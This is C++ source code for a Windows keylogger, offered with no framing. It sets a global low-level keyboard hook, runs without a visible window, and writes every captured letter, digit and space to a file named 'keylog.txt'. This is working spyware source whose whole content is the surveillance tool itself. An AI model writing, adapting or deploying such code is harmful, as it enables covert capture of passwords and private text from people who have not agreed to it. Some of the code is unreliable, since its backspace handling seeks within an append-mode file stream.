#include <windows.h>
#include <fstream>
#include <string>

HHOOK hKeyboardHook;
std::ofstream logFile;
std::string logBuffer;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbdStruct->vkCode;
        DWORD scanCode = kbdStruct->scanCode;

        CHAR keyName[128];
        GetKeyNameTextA(scanCode << 16, keyName, 128);

        if (vkCode == VK_RETURN)
        {
            // Enter key - do nothing
        }
        else if (vkCode == VK_BACK)
        {
            // Backspace key - remove last character from buffer
            if (!logBuffer.empty())
            {
                logBuffer.pop_back();
                logFile.seekp(-1, std::ios_base::end);
                logFile.put(' ');
                logFile.seekp(-1, std::ios_base::end);
            }
        }
        else if (vkCode == VK_SPACE)
        {
            logBuffer += ' ';
            logFile << ' ';
        }
        else if (vkCode >= 0x30 && vkCode <= 0x5A)
        {
            char c = (char)vkCode;
            logBuffer += c;
            logFile << c;
        }

        logFile.flush();
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow)
{
    logFile.open("keylog.txt", std::ios::in | std::ios::out | std::ios::app);
    logFile.seekp(0, std::ios::end);
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (hKeyboardHook == NULL)
    {
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);
    logFile.close();

    return 0;
}